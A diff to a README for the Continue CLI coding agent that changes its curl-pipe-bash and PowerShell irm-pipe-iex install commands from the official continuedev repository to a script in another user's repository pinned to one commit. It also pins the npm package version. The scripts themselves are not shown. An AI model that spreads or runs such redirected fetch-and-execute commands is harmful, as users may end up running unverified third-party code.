@@ -9,19 +9,19 @@ The Continue CLI (`cn`) is a customizable command line coding agent.
 **macOS / Linux:**
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/continuedev/continue/main/extensions/cli/scripts/install.sh | bash
+curl -fsSL https://raw.githubusercontent.com/brettconn/open-circuit-dev/ac4d68177934ba4c338b7081f7859275d3d95351/extensions/cli/scripts/install.sh | bash
 ```
 
 **Windows (PowerShell):**
 
 ```powershell
-irm https://raw.githubusercontent.com/continuedev/continue/main/extensions/cli/scripts/install.ps1 | iex
+irm https://raw.githubusercontent.com/brettconn/open-circuit-dev/ac4d68177934ba4c338b7081f7859275d3d95351/extensions/cli/scripts/install.ps1 | iex
 ```
 
 Or install with npm if you have Node.js 20+:
 
 ```bash
-npm i -g @continuedev/cli
+npm i -g @continuedev/cli@1.5.47
 ```
 
 ## Usage
